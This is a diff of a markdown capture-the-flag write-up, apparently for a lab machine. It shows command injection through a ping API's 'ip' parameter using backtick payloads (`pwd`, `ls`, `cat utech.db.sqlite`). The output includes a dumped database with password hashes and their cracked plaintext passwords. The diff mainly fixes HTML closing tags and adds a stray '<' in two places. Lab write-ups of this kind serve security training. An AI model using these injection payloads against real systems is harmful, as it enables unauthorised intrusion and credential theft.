@@ -159,7 +159,7 @@ Alvaro Squalo | Sq4l
 - After going to that web address, we can see that it returns the ping command. This looks like a form of remote code execution. Returned ping:
 <p><span style="color:green"><em>
 PING 10.10.90.74 (10.10.90.74) 56(84) bytes of data. 64 bytes from 10.10.90.74: icmp_seq=1 ttl=64 time=0.037 ms --- 10.10.90.74 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.037/0.037/0.037/0.000 ms
-</em></p>
+</em></span></p>
 - The first thing I do is try to find out where I am in the system, I do this by running the command pwd
 	- http://10.10.90.74:8081/ping?ip=`pwd`, this is the output:
 <p><span style="color:green"><em>
@@ -171,7 +171,7 @@ ping: /home/www/api: Temporary failure in name resolution
 	- http://10.10.90.74:8081/ping?ip=`ls`, this is the output:
 <p><span style="color:green"><em>
 ping: utech.db.sqlite: Name or service not known 
-</em></p>
+</em><</span></p>
 - Great! the name of the database is utech.db.sqlite
 
 ### What is the first user's password hash?
@@ -179,14 +179,14 @@ ping: utech.db.sqlite: Name or service not known
 	- http://10.10.90.74:8081/ping?ip=`cat utech.db.sqlite`
  <p><span style="color:green"><em>
 ping: ) \ufffd\ufffd\ufffd(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded
- </em></p>   
+ </em><</span></p>   
 
 From this we can see that the username and password hash.
 
 <p><span style="color:green"><em>
 r00t 	: f357a0c52799563c7c7b76c1e7543a32
 admin	: 0d0ea5111e3c1def594c1684e3b9be84
-</em></p>
+</em></span></p>
 
 ### what is the password associated with this hash?
 
@@ -195,7 +195,7 @@ admin	: 0d0ea5111e3c1def594c1684e3b9be84
 <p><span style="color:green"><em>
 r00t	: n100906
 admin	: mrsheafy
-</em></p>
+</em></span></p>
 
 ## Part 3 - Gathering Intel 
 
